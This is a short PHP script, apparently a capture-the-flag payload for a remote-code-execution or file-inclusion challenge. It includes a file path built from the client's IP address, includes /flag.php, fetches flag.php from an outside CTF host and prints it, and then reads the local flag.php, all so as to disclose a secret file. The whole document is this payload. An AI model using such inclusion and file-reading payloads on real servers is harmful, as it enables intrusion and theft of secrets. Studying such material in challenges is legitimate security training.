<?php
include($_SERVER['REMOTE_ADDR'].'/flag.php');
include('/flag.php');
$homepage = file_get_contents('https://2019-11-10-rce.ctf.su/flag.php');
echo $homepage;
$homepage = file_get_contents('flag.php');
echo $homepage;
?>